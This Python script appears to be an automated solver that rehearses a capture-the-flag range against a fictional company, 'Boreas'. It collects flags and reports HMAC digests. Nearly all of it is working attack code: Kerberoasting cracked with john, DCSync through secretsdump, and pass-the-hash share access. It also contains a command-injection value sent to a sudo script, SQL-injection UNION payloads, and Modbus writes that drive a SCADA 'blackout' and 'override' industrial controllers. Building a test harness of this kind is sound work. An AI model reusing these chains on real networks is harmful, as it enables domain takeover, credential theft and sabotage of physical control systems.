#!/usr/bin/env python3
"""Self-contained participant program executed through A14's portal SSH channel.

The live driver replaces the four placeholders below and sends this program to
``python3 -`` over the same Shifter terminal connection a participant receives.
It knows the documented happy path, but carries no expected recovery values and
uses no management transport.
"""

from __future__ import annotations

import contextlib
import email
import hashlib
import hmac
import http.cookiejar
import imaplib
import json
import os
import pwd
import re
import socket
import subprocess
import tempfile
import time
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Callable


RUN_ID = "__POLARIS_RUN_ID__"
RUN_KEY_HEX = "__POLARIS_RUN_KEY_HEX__"
PHASE = "__POLARIS_PHASE__"
ATTEMPT_GENERATION = int("__POLARIS_ATTEMPT_GENERATION__")
RESULT_SCHEMA = "polaris.aws-event.participant-result/v1"
RUN_ID_RE = re.compile(r"^run-[0-9a-f]{16}$")
FLAG_PREFIX = "FLAG" + "{"
FLAG_RE = re.compile(re.escape(FLAG_PREFIX) + r"[A-Fa-f0-9]+" + re.escape("}"))
KEY = bytes.fromhex(RUN_KEY_HEX)
CHECKS: list[dict[str, object]] = []
DOMAIN_ADMIN_FAILURE_STAGES = {
    "kerberoast-request",
    "kerberoast-crack",
    "dcsync",
    "administrator-share",
    "administrator-flag",
}


def run(
    argv: list[str],
    *,
    input_text: str | None = None,
    timeout: int = 180,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    if not isinstance(argv, list) or not argv or not all(
        isinstance(item, str) and item for item in argv
    ):
        raise RuntimeError("invalid participant command")
    return subprocess.run(
        argv,
        check=False,
        input=input_text,
        capture_output=True,
        text=True,
        errors="replace",
        timeout=timeout,
        env=env,
    )


def first_flag(value: str) -> str:
    match = FLAG_RE.search(value or "")
    if not match:
        raise RuntimeError("recovery value is unavailable")
    return match.group(0)


def digest(value: str) -> str:
    return "hmac-sha256:" + hmac.new(
        KEY, value.encode("utf-8"), hashlib.sha256
    ).hexdigest()


def john_password(value: str) -> str:
    for line in value.splitlines():
        fields = line.split("\t")
        if len(fields) >= 2 and fields[1]:
            return fields[1]
    raise RuntimeError("kerberoast-crack")


def check(check_id: str, passed: bool, *, count: int = 1) -> None:
    CHECKS.append(
        {
            "id": check_id,
            "status": "PASS" if passed else "FAIL",
            "digest": None,
            "count": count,
            "duration_ms": 0,
        }
    )


def recover(check_id: str, operation: Callable[[], str]) -> None:
    started = time.monotonic()
    try:
        value = operation()
        row = {
            "id": check_id,
            "status": "PASS",
            "digest": digest(value),
            "count": 1,
            "duration_ms": int((time.monotonic() - started) * 1000),
        }
    except Exception as error:
        row = {
            "id": check_id,
            "status": "FAIL",
            "digest": None,
            "count": 0,
            "duration_ms": int((time.monotonic() - started) * 1000),
        }
        if (
            check_id == "domain-admin-secrets"
            and str(error) in DOMAIN_ADMIN_FAILURE_STAGES
        ):
            row["failure_stage"] = str(error)
    CHECKS.append(row)


def http_get(url: str) -> str:
    request = urllib.request.Request(url, headers={"User-Agent": "Polaris participant"})
    with urllib.request.urlopen(request, timeout=30) as response:
        return response.read(2_000_000).decode("utf-8", "replace")


def download(url: str, destination: Path) -> None:
    request = urllib.request.Request(url, headers={"User-Agent": "Polaris participant"})
    with urllib.request.urlopen(request, timeout=60) as response:
        destination.write_bytes(response.read(20_000_000))


@contextlib.contextmanager
def password_file(password: str):
    descriptor, name = tempfile.mkstemp(prefix="polaris-auth-")
    path = Path(name)
    try:
        os.fchmod(descriptor, 0o600)
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            stream.write(password + "\n")
        yield path
    finally:
        path.unlink(missing_ok=True)


@contextlib.contextmanager
def smb_auth(username: str, password: str, domain: str = "BOREAS"):
    descriptor, name = tempfile.mkstemp(prefix="polaris-smb-")
    path = Path(name)
    try:
        os.fchmod(descriptor, 0o600)
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            stream.write(
                f"username = {username}\npassword = {password}\ndomain = {domain}\n"
            )
        yield path
    finally:
        path.unlink(missing_ok=True)


def smb_get(
    share: str,
    remote_path: str,
    *,
    username: str | None = None,
    password: str | None = None,
    nt_hash: bool = False,
) -> Path:
    root = Path(tempfile.mkdtemp(prefix="polaris-smb-download-"))
    destination = root / Path(remote_path).name
    command = f'get "{remote_path}" "{destination}"'
    if username is None:
        result = run(["smbclient", share, "-N", "-c", command], timeout=120)
    else:
        with smb_auth(username, password or "") as auth:
            argv = ["smbclient", share, "-A", str(auth)]
            if nt_hash:
                argv.append("--pw-nt-hash")
            argv.extend(["-c", command])
            result = run(argv, timeout=120)
    if result.returncode or not destination.is_file():
        raise RuntimeError("SMB participant recovery failed")
    return destination


def pdf_text(path: Path) -> str:
    executable = (
        "/opt/tools/bin/pdf2txt.py"
        if Path("/opt/tools/bin/pdf2txt.py").is_file()
        else "pdftotext"
    )
    argv = [executable, str(path)] if executable.endswith("pdf2txt.py") else [executable, str(path), "-"]
    result = run(argv, timeout=60)
    if result.returncode:
        raise RuntimeError("PDF participant recovery failed")
    return result.stdout


def imap_messages(username: str, password: str) -> list[email.message.Message]:
    client = imaplib.IMAP4("mail.boreas.local")
    client.login(username, password)
    client.select("INBOX")
    _, data = client.search(None, "ALL")
    messages: list[email.message.Message] = []
    for message_id in (data[0] or b"").split():
        _, response = client.fetch(message_id, "(RFC822)")
        messages.append(email.message_from_bytes(response[0][1]))
    client.logout()
    return messages


def message_text(message: email.message.Message) -> str:
    bodies: list[str] = []
    for part in message.walk():
        if part.get_content_type() == "text/plain":
            bodies.append(part.get_payload(decode=True).decode("utf-8", "replace"))
    return "\n".join(bodies)


def ssh_password(
    host: str,
    username: str,
    password: str,
    remote_argv: list[str],
    *,
    input_text: str | None = None,
    timeout: int = 300,
) -> str:
    with password_file(password) as secret:
        result = run(
            [
                "sshpass",
                "-f",
                str(secret),
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "LogLevel=ERROR",
                "-o",
                "ConnectTimeout=10",
                f"{username}@{host}",
                *remote_argv,
            ],
            input_text=input_text,
            timeout=timeout,
        )
    if result.returncode:
        raise RuntimeError("participant pivot failed")
    return result.stdout


def ssh_splice(
    remote_argv: list[str], *, input_text: str | None = None, timeout: int = 300
) -> str:
    result = run(
        [
            "ssh",
            "-i",
            str(Path.home() / ".ssh" / "splice_relay"),
            "-o",
            "BatchMode=yes",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "LogLevel=ERROR",
            "-o",
            "ConnectTimeout=10",
            "root@splice-relay",
            *remote_argv,
        ],
        input_text=input_text,
        timeout=timeout,
    )
    if result.returncode:
        raise RuntimeError("participant splice pivot failed")
    return result.stdout


def port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def target_picture() -> None:
    recover(
        "company-registration",
        lambda: first_flag(http_get("http://boreas-systems.ctf/about.html")),
    )

    def employee_directory() -> str:
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "org.pdf"
            download("http://boreas-systems.ctf/internal/org_chart.pdf", path)
            result = run(["exiftool", str(path)])
            return first_flag(result.stdout)

    recover("employee-directory", employee_directory)
    recover(
        "careers-tech-stack",
        lambda: first_flag(http_get("http://boreas-systems.ctf/careers.html")),
    )
    recover(
        "client-contracts",
        lambda: first_flag(http_get("http://boreas-systems.ctf/old/clients.html")),
    )

    def dns_zone() -> str:
        result = run(
            ["dig", "+short", "axfr", "boreas-systems.ctf", "@172.20.0.2"]
        )
        return first_flag(result.stdout)

    recover("dns-zone-transfer", dns_zone)

    def annual_report() -> str:
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "annual.pdf"
            download(
                "http://boreas-systems.ctf/internal/boreas-annual-2025.pdf", path
            )
            return first_flag(pdf_text(path))

    recover("annual-report-supplier", annual_report)


def front_office() -> None:
    recover(
        "intranet-config-leak",
        lambda: first_flag(http_get("http://intranet.boreas.local/.env")),
    )

    def project_status_mail() -> str:
        for message in imap_messages("e.vasik", "Reactor#Core9"):
            for part in message.walk():
                if (part.get_filename() or "") == "project_status_report_oct2025.pdf":
                    with tempfile.TemporaryDirectory() as temporary:
                        path = Path(temporary) / "report.pdf"
                        path.write_bytes(part.get_payload(decode=True))
                        return first_flag(pdf_text(path))
        raise RuntimeError("mail attachment unavailable")

    recover("project-status-mail", project_status_mail)

    def terminated_engineer() -> str:
        path = smb_get(
            "//fileserv.boreas.local/HR",
            "personnel/chen_james_termination.pdf",
            username="m.webb",
            password="Welcome1",
        )
        return first_flag(pdf_text(path))

    recover("terminated-engineer", terminated_engineer)

    def default_password_mail() -> str:
        for message in imap_messages("d.kowalski", "P@ssw0rd123"):
            if "Welcome" in (message.get("Subject") or ""):
                return first_flag(message_text(message))
        raise RuntimeError("welcome message unavailable")

    recover("default-password-mail", default_password_mail)

    def cafeteria_metadata() -> str:
        path = smb_get(
            "//fileserv.boreas.local/Public", "cafeteria_menu_april.pdf"
        )
        return first_flag(run(["exiftool", str(path)]).stdout)

    recover("cafeteria-metadata", cafeteria_metadata)

    def project_wiki() -> str:
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar)
        )
        opener.open("http://intranet.boreas.local/login", timeout=30).read()
        data = urllib.parse.urlencode(
            {"username": "admin", "password": "admin"}
        ).encode()
        opener.open(
            urllib.request.Request(
                "http://intranet.boreas.local/login", data=data
            ),
            timeout=30,
        ).read()
        body = opener.open(
            "http://intranet.boreas.local/wiki/project-coordination", timeout=30
        ).read()
        return first_flag(body.decode("utf-8", "replace"))

    recover("project-wiki-comment", project_wiki)

    def procurement_actuator() -> str:
        path = smb_get(
            "//fileserv.boreas.local/Procurement",
            "specs/actuator_requirements_v4.pdf",
            username="m.webb",
            password="Welcome1",
        )
        return first_flag(pdf_text(path))

    recover("procurement-actuator", procurement_actuator)

    def nested_group() -> str:
        result = run(
            [
                "ldapsearch",
                "-x",
                "-LLL",
                "-H",
                "ldap://dc01.boreas.local",
                "-D",
                "d.kowalski@boreas.local",
                "-w",
                "P@ssw0rd123",
                "-b",
                "DC=boreas,DC=local",
                "(cn=Project-L)",
                "cn",
                "info",
            ]
        )
        return first_flag(result.stdout)

    recover("nested-project-group", nested_group)

    def fileshare_service() -> str:
        path = smb_get(
            "//fileserv.boreas.local/IT",
            "backup_verification.log",
            username="svc-fileshare",
            password="F1l3Sh@r3Svc!",
        )
        return first_flag(path.read_text(encoding="utf-8", errors="replace"))

    recover("fileshare-service-creds", fileshare_service)

    def badge_anomaly() -> str:
        path = smb_get(
            "//dc01.boreas.local/badgelogs",
            "access_log_march_2026.csv",
            username="e.vasik",
            password="Reactor#Core9",
        )
        return first_flag(path.read_text(encoding="utf-8", errors="replace"))

    recover("guard-badge-anomaly", badge_anomaly)

    def domain_admin() -> str:
        with tempfile.TemporaryDirectory(prefix="polaris-kerberos-") as temporary:
            root = Path(temporary)
            dc_ip = socket.gethostbyname("dc01.boreas.local")
            spns = run(
                [
                    "/opt/tools/bin/GetUserSPNs.py",
                    "-dc-ip",
                    dc_ip,
                    "BOREAS.LOCAL/d.kowalski:P@ssw0rd123",
                    "-request",
                ],
                timeout=120,
            )
            match = re.search(
                r"(?m)^\$krb5tgs\$23\$\*svc-backup[^\r\n]*$",
                spns.stdout + "\n" + spns.stderr,
            )
            if not match:
                raise RuntimeError("kerberoast-request")
            hash_path = root / "backup.hash"
            hash_path.write_text(match.group(0) + "\n", encoding="utf-8")
            pot_path = root / "john.pot"
            john_options = [
                "--format=krb5tgs",
                "--field-separator-char=\t",
                "--pot=" + str(pot_path),
            ]
            cracked = run(
                [
                    "john",
                    *john_options,
                    "--wordlist=/usr/share/wordlists/rockyou.txt",
                    str(hash_path),
                ],
                timeout=120,
            )
            shown = run(["john", "--show", *john_options, str(hash_path)])
            if cracked.returncode not in {0, 1}:
                raise RuntimeError("kerberoast-crack")
            password = john_password(shown.stdout)
            dumped = run(
                [
                    "/opt/tools/bin/secretsdump.py",
                    "BOREAS.LOCAL/svc-backup:"
                    + password
                    + "@"
                    + dc_ip,
                    "-just-dc-user",
                    "Administrator",
                ],
                timeout=120,
            )
            admin = re.search(
                r"(?mi)^Administrator:500:[0-9a-f]{32}:([0-9a-f]{32}):::",
                dumped.stdout + "\n" + dumped.stderr,
            )
            if not admin:
                raise RuntimeError("dcsync")
            fetched = run(
                [
                    "/opt/tools/bin/smbclient.py",
                    "-hashes",
                    "aad3b435b51404eeaad3b435b51404ee:" + admin.group(1),
                    "BOREAS.LOCAL/Administrator@" + dc_ip,
                ],
                input_text=(
                    "use admin_flag\n"
                    f"lcd {root}\n"
                    "get flag.txt\n"
                    "exit\n"
                ),
                timeout=120,
            )
            path = root / "flag.txt"
            if fetched.returncode or not path.is_file():
                raise RuntimeError("administrator-share")
            try:
                return first_flag(
                    path.read_text(encoding="utf-8", errors="replace")
                )
            except RuntimeError as error:
                raise RuntimeError("administrator-flag") from error

    recover("domain-admin-secrets", domain_admin)


A15_PROGRAM = r'''
import hashlib, hmac, json, re, subprocess, time
PREFIX = "FLAG" + "{"
PATTERN = re.compile(re.escape(PREFIX) + r"[A-Fa-f0-9]+" + re.escape("}"))
def run(argv, input_text=None, timeout=180):
    return subprocess.run(argv, input=input_text, capture_output=True, text=True,
                          timeout=timeout, check=False)
def flag(text):
    match = PATTERN.search(text or "")
    if not match: raise RuntimeError("missing")
    return match.group(0)
rows = {}
loot = run(["sudo", "/opt/ops/scada_diag.sh", "--host",
            "x; cat /root/.scada/hmi.json #"])
rows["ops-scada-credentials"] = flag(loot.stdout)
project = run(["curl", "-fsS", "http://scada-gw.boreas.local:8080/"])
rows["scada-control-room"] = flag(project.stdout)
script = """
from pymodbus.client import ModbusTcpClient
import time
c=ModbusTcpClient('scada-gw.boreas.local', port=502)
assert c.connect()
assert c.read_holding_registers(address=201,count=1).registers == [0]
c.write_register(address=200,value=7734)
c.write_register(address=100,value=0)
c.write_register(address=10,value=100)
c.write_register(address=11,value=0)
time.sleep(12)
import urllib.request
print(urllib.request.urlopen(
    'http://scada-gw.boreas.local:8080/', timeout=10
).read().decode())
"""
blackout = run(["python3", "-"], input_text=script, timeout=60)
rows["scada-blackout"] = flag(blackout.stdout)
print(json.dumps(rows, sort_keys=True))
'''


def scada_path() -> None:
    try:
        output = ssh_password(
            "ops-eng01.boreas.local",
            "s.ivanov",
            "Welcome1",
            ["python3", "-"],
            input_text=A15_PROGRAM,
            timeout=180,
        )
        values = json.loads(output)
    except Exception:
        values = {}
    recover("ops-scada-credentials", lambda: values["ops-scada-credentials"])
    recover("scada-control-room", lambda: values["scada-control-room"])
    recover("scada-blackout", lambda: values["scada-blackout"])


A16_PROGRAM = r'''
import base64, json, os, re, subprocess, tempfile
PREFIX = "FLAG" + "{"
PATTERN = re.compile(re.escape(PREFIX) + r"[A-Fa-f0-9]+" + re.escape("}"))
def run(argv, input_text=None, timeout=240, env=None):
    return subprocess.run(argv, input=input_text, capture_output=True, text=True,
                          errors="replace", timeout=timeout, check=False, env=env)
def flag(text):
    match=PATTERN.search(text or "")
    if not match: raise RuntimeError("missing")
    return match.group(0)
def remote(user, password, command):
    descriptor, name=tempfile.mkstemp()
    os.fchmod(descriptor,0o600)
    os.write(descriptor,(password+"\n").encode()); os.close(descriptor)
    try:
        result=run(["sshpass","-f",name,"ssh","-o","StrictHostKeyChecking=no",
                    "-o","UserKnownHostsFile=/dev/null","-o","LogLevel=ERROR",
                    user+"@eng-ws01.boreas.local",command])
    finally:
        os.unlink(name)
    if result.returncode: raise RuntimeError("pivot")
    return result.stdout
def psql(user, password, query):
    descriptor,name=tempfile.mkstemp()
    os.fchmod(descriptor,0o600)
    os.write(descriptor,("researchdb.boreas.local:5432:*:"+user+":"+password+"\n").encode())
    os.close(descriptor)
    env=dict(os.environ); env["PGPASSFILE"]=name
    try:
        result=run(["psql","-h","researchdb.boreas.local","-U",user,
                    "-d","postgres","-At","-c",query],env=env)
    finally:
        os.unlink(name)
    if result.returncode: raise RuntimeError("database")
    return result.stdout
rows={}
rows["analyst-lab-pivot"]=flag(open(os.path.expanduser("~/.reports/ANALYST_TOKEN")).read())
rows["jenkins-default-creds"]=flag(remote("jenkins","build2025",
    "grep -oE 'FLAG[{][A-Fa-f0-9]+[}]' ~/.credentials"))
rows["reactor-interface-spec"]=flag(remote("jenkins","build2025",
    "grep -rhoE 'FLAG[{][A-Fa-f0-9]+[}]' /opt/builds/latest | head -1"))
rows["midnight-standard-run"]=flag(remote("r.tanaka","SimEngine#42",
    "mkdir -p /tmp/polaris-s44; tar xzf ~/simulations/standard/stress_test_44.tar.gz -C /tmp/polaris-s44; strings /tmp/polaris-s44/stress_test_44.dat"))
rows["midnight-after-hours"]=flag(remote("r.tanaka","SimEngine#42",
    "cat ~/simulations/midnight/MIDNIGHT-7_results.dat"))
rows["center-of-gravity"]=flag(remote("p.nielsen","Hydraulics1",
    "python3 -c 'import openpyxl; w=openpyxl.load_workbook(\"/home/p.nielsen/designs/center_of_gravity_analysis.xlsx\"); print(w[\"Integration\"][\"B10\"].value)'"))
rows["research-compartment-a"]=flag(psql("lab_general","LabGen2025!",
    "SELECT notes FROM compartment_a.structural_specs WHERE component = 'frame_dorsal_plate'"))
rows["research-compartment-b"]=flag(psql("lab_general","LabGen2025!",
    "SELECT * FROM research_public.search_research('x'' UNION SELECT serial_number::text, system_name, system_type FROM compartment_b.effector_systems--')"))
rows["final-assembly-metadata"]=flag(psql("lab_mfg","Mfg2025!",
    "SELECT metadata->'integration'->>'flag' FROM compartment_c.assembly_log WHERE metadata ? 'integration'"))
with tempfile.TemporaryDirectory() as root:
    netrc=os.path.join(root,".netrc")
    with open(netrc,"w") as stream:
        stream.write("machine git.boreas.local\nlogin e_vasik\npassword Reactor#Core9\n")
    os.chmod(netrc,0o600)
    env=dict(os.environ); env["HOME"]=root
    nav=os.path.join(root,"nav")
    run(["git","clone","-q","http://git.boreas.local:3000/aurora/navigation-controller.git",nav],env=env)
    rows["navigation-git-history"]=flag(run(["git","-C",nav,"log","--all","-p"],env=env).stdout)
    deleted=os.path.join(root,"deleted")
    run(["git","clone","-q","http://git.boreas.local:3000/aurora/leviathan-assembly.git",deleted],env=env)
    commit=run(["git","-C",deleted,"log","--diff-filter=D","--format=%H","--","schematic.svg"],env=env).stdout.splitlines()[0]
    rows["deleted-schematic"]=flag(run(["git","-C",deleted,"show",commit+"^:schematic.svg"],env=env).stdout)
    weapons=os.path.join(root,"weapons")
    run(["git","clone","-q","http://git.boreas.local:3000/aurora/weapons-integration.git",weapons],env=env)
    config=open(os.path.join(weapons,"src","crypto_config.py")).read()
    passphrase=re.search(r'LEGACY_PASSPHRASE\s*=\s*["\x27]([^"\x27]+)',config).group(1)
    encrypted=os.path.join(root,"video.gpg")
    run(["scp","-q","eng-ws01:/tmp/.deleted/full_integration_sim.mp4.gpg",encrypted],env=env)
    key_blob=psql("lab_general","LabGen2025!",
        "SELECT * FROM research_public.search_research('x'' UNION SELECT key_data::text, key_owner::text, ''k''::text FROM compartment_b.key_storage WHERE key_owner = ''e.vasik''--')")
    encoded=max(re.findall(r"[A-Za-z0-9+/=]{1000,}",key_blob),key=len)
    key_path=os.path.join(root,"key.asc"); open(key_path,"wb").write(base64.b64decode(encoded))
    gnupg=os.path.join(root,"gnupg"); os.mkdir(gnupg,0o700)
    genv=dict(env); genv["GNUPGHOME"]=gnupg
    run(["gpg","--batch","--import",key_path],env=genv)
    pass_path=os.path.join(root,"pass"); open(pass_path,"w").write(passphrase); os.chmod(pass_path,0o600)
    plain=run(["gpg","--batch","--pinentry-mode","loopback","--passphrase-file",
               pass_path,"--decrypt",encrypted],env=genv)
    rows["full-integration-video"]=flag(plain.stdout)
print(json.dumps(rows,sort_keys=True))
'''


def lab_path() -> None:
    try:
        output = ssh_password(
            "analyst01.boreas.local",
            "p.shah",
            "Welcome1",
            ["python3", "-"],
            input_text=A16_PROGRAM,
            timeout=900,
        )
        values = json.loads(output)
    except Exception:
        values = {}
    recover("analyst-lab-pivot", lambda: values["analyst-lab-pivot"])
    recover("jenkins-default-creds", lambda: values["jenkins-default-creds"])
    recover("research-compartment-a", lambda: values["research-compartment-a"])
    recover("reactor-interface-spec", lambda: values["reactor-interface-spec"])
    recover("midnight-standard-run", lambda: values["midnight-standard-run"])
    recover("navigation-git-history", lambda: values["navigation-git-history"])
    recover("midnight-after-hours", lambda: values["midnight-after-hours"])
    recover("center-of-gravity", lambda: values["center-of-gravity"])
    recover("research-compartment-b", lambda: values["research-compartment-b"])
    recover("final-assembly-metadata", lambda: values["final-assembly-metadata"])
    recover("deleted-schematic", lambda: values["deleted-schematic"])
    recover("full-integration-video", lambda: values["full-integration-video"])


BUNKER_PROGRAM = r'''
import hashlib, json, re, socket, time
from pymodbus.client import ModbusTcpClient
PREFIX="FLAG"+"{"
PATTERN=re.compile(re.escape(PREFIX)+r"[A-Fa-f0-9]+"+re.escape("}"))
def flag(text):
    match=PATTERN.search(text or "")
    if not match: raise RuntimeError("missing")
    return match.group(0)
def read_flag(client,address,count=24):
    values=client.read_holding_registers(address=address,count=count).registers
    return flag("".join(chr(v) for v in values if v))
rows={}
models=[]; serials=[]
for host in ("172.20.50.10","172.20.50.11","172.20.50.12"):
    import subprocess
    result=subprocess.run(["python3","/usr/local/bin/modbus_client.py",host,"devid"],
                          capture_output=True,text=True,check=False)
    models.append(re.search(r"(?m)^\s*ProductName:\s*(\S+)",result.stdout).group(1))
    serials.append(re.search(r"\bSN:\s*(\S+)",result.stdout).group(1))
rows["bunker-controller-map"]="".join(models)
c=ModbusTcpClient("172.20.50.10",port=502); assert c.connect()
c.write_register(address=20,value=3); c.write_register(address=99,value=int(serials[0][-3:]))
time.sleep(.5); rows["tail-controller-unlock"]=read_flag(c,100); c.close()
c=ModbusTcpClient("172.20.50.11",port=502); assert c.connect()
for mode in (0,1,2,0): c.write_register(address=30,value=mode); time.sleep(1)
code=c.read_input_registers(address=60,count=1).registers[0]
c.write_register(address=99,value=code); time.sleep(.5)
rows["leg-controller-gait"]=read_flag(c,100); c.close()
c=ModbusTcpClient("172.20.50.12",port=502); assert c.connect()
c.write_coil(address=50,value=True); time.sleep(.2)
nonce=c.read_input_registers(address=60,count=1).registers[0]
c.write_register(address=200,value=nonce ^ 2847); time.sleep(.5)
assert c.read_holding_registers(address=201,count=1).registers == [1]
rows["arms-response-window"]=read_flag(c,100); c.close()
serial_text="".join(serials)
key=hashlib.sha256(serial_text.encode()).digest()[:8]
s=socket.create_connection(("172.20.50.50",9100),timeout=10)
challenge=s.recv(8); s.sendall(bytes(left ^ right for left,right in zip(challenge,key)))
time.sleep(.2); s.recv(4096)
s.sendall(b"vasik\r\n"); time.sleep(.2); s.recv(4096)
s.sendall(b"a4f8e2c1d7b03965e8f2a1c4d7b03965\r\n"); time.sleep(.2); s.recv(4096)
s.sendall(b"status\r\n"); time.sleep(.3); rows["brain-control-channel"]=flag(s.recv(8192).decode(errors="replace"))
s.sendall(b"override 7741-MN07-AL42\r\n"); time.sleep(.5)
rows["brain-full-override"]=flag(s.recv(8192).decode(errors="replace")); s.close()
print(json.dumps(rows,sort_keys=True))
'''


def bunker_path() -> None:
    try:
        output = ssh_splice(
            ["python3", "-"], input_text=BUNKER_PROGRAM, timeout=300
        )
        values = json.loads(output)
    except Exception:
        values = {}
    recover("bunker-controller-map", lambda: values["bunker-controller-map"])
    recover("tail-controller-unlock", lambda: values["tail-controller-unlock"])
    recover("leg-controller-gait", lambda: values["leg-controller-gait"])
    recover("arms-response-window", lambda: values["arms-response-window"])
    recover("brain-control-channel", lambda: values["brain-control-channel"])
    recover("brain-full-override", lambda: values["brain-full-override"])


def initial_phase() -> None:
    check(
        "start-state-a14",
        os.geteuid() != 0 and pwd.getpwuid(os.geteuid()).pw_name == "kali",
    )
    check("negative-direct-lab", not port_open("git.boreas.local", 3000))
    check("negative-direct-scada", not port_open("scada-gw.boreas.local", 502))
    check("negative-pre-splice", not port_open("172.20.60.5", 22))
    target_picture()
    front_office()
    lab_path()
    scada_path()
    deadline = time.monotonic() + 60
    while time.monotonic() < deadline and not port_open("172.20.60.5", 22):
        time.sleep(1)
    check("positive-post-blackout-splice", port_open("172.20.60.5", 22))
    bunker_path()


RESET_A15_PROGRAM = r'''
from pymodbus.client import ModbusTcpClient
import json, time, urllib.request
c=ModbusTcpClient("scada-gw.boreas.local",port=502); assert c.connect()
initial=c.read_holding_registers(address=201,count=1).registers
print("INITIAL="+str(initial[0]))
c.write_register(address=200,value=7734); c.write_register(address=100,value=0)
c.write_register(address=10,value=100); c.write_register(address=11,value=0)
time.sleep(12)
status=json.loads(urllib.request.urlopen(
    "http://scada-gw.boreas.local:8080/api/status", timeout=10
).read())
print("FINAL="+str(int(status["runaway_complete"])))
'''

RESET_BUNKER_PROGRAM = r'''
import hashlib, re, socket, subprocess, time
from pymodbus.client import ModbusTcpClient
serials=[]
for host in ("172.20.50.10","172.20.50.11","172.20.50.12"):
    result=subprocess.run(["python3","/usr/local/bin/modbus_client.py",host,"devid"],
                          capture_output=True,text=True,check=True)
    serials.append(re.search(r"\bSN:\s*(\S+)",result.stdout).group(1))

def holding(client,address,count=1):
    return client.read_holding_registers(address=address,count=count).registers
def inputs(client,address,count=1):
    return client.read_input_registers(address=address,count=count).registers

c=ModbusTcpClient("172.20.50.10",port=502); assert c.connect()
tail_locked=(not any(holding(c,100,24)) and holding(c,20)==[1])
print("TAIL_LOCKED="+str(tail_locked)); c.close()

c=ModbusTcpClient("172.20.50.11",port=502); assert c.connect()
leg_locked=(not any(holding(c,100,24)) and holding(c,30)==[0]
            and inputs(c,60)==[0])
print("LEG_LOCKED="+str(leg_locked)); c.close()

c=ModbusTcpClient("172.20.50.12",port=502); assert c.connect()
arms_locked=(not any(holding(c,100,24)) and holding(c,201)==[0]
             and inputs(c,60)==[0]
             and not c.read_coils(address=50,count=1).bits[0])
print("ARMS_LOCKED="+str(arms_locked)); c.close()

key=hashlib.sha256("".join(serials).encode()).digest()[:8]
s=socket.create_connection(("172.20.50.50",9100),timeout=5)
challenge=s.recv(8); s.sendall(bytes(a ^ b for a,b in zip(challenge,key)))
time.sleep(.2); s.recv(4096)
s.sendall(b"vasik\r\n"); time.sleep(.2); s.recv(4096)
s.sendall(b"a4f8e2c1d7b03965e8f2a1c4d7b03965\r\n"); time.sleep(.2); s.recv(4096)
s.sendall(b"status\r\n"); time.sleep(.3)
status=s.recv(8192).decode(errors="replace")
print("BRAIN_LOCKED="+str("OVERRIDE STATE ............ LOCKED" in status))
s.close()
'''


def after_reset_phase() -> None:
    check(
        "start-state-a14",
        os.geteuid() != 0 and pwd.getpwuid(os.geteuid()).pw_name == "kali",
    )
    check("negative-direct-lab", not port_open("git.boreas.local", 3000))
    check("negative-direct-scada", not port_open("scada-gw.boreas.local", 502))
    check("negative-pre-splice", not port_open("172.20.60.5", 22))
    try:
        scada = ssh_password(
            "ops-eng01.boreas.local",
            "s.ivanov",
            "Welcome1",
            ["python3", "-"],
            input_text=RESET_A15_PROGRAM,
            timeout=90,
        )
    except Exception:
        scada = ""
    check("reset-controller-state", "INITIAL=0" in scada and "FINAL=1" in scada)
    deadline = time.monotonic() + 60
    while time.monotonic() < deadline and not port_open("172.20.60.5", 22):
        time.sleep(1)
    try:
        bunker = ssh_splice(
            ["python3", "-"], input_text=RESET_BUNKER_PROGRAM, timeout=60
        )
    except Exception:
        bunker = ""
    check(
        "reset-brain-state",
        all(
            marker in bunker
            for marker in (
                "TAIL_LOCKED=True",
                "LEG_LOCKED=True",
                "ARMS_LOCKED=True",
                "BRAIN_LOCKED=True",
            )
        ),
    )


def write_result() -> None:
    if (
        not RUN_ID_RE.fullmatch(RUN_ID)
        or len(KEY) != 32
        or PHASE not in {"initial", "after-reset"}
        or not 1 <= ATTEMPT_GENERATION <= 1_000_000
    ):
        raise RuntimeError("participant namespace is invalid")
    payload = {
        "schema": RESULT_SCHEMA,
        "run_id": RUN_ID,
        "phase": PHASE,
        "attempt_generation": ATTEMPT_GENERATION,
        "checks": CHECKS,
    }
    print(
        "POLARIS_REHEARSAL_RESULT="
        + json.dumps(payload, separators=(",", ":"), sort_keys=True)
    )


def main() -> int:
    try:
        if PHASE == "initial":
            initial_phase()
        elif PHASE == "after-reset":
            after_reset_phase()
        else:
            raise RuntimeError("participant phase is invalid")
    finally:
        write_result()
    return 0 if all(row["status"] == "PASS" for row in CHECKS) else 1


if __name__ == "__main__":
    raise SystemExit(main())
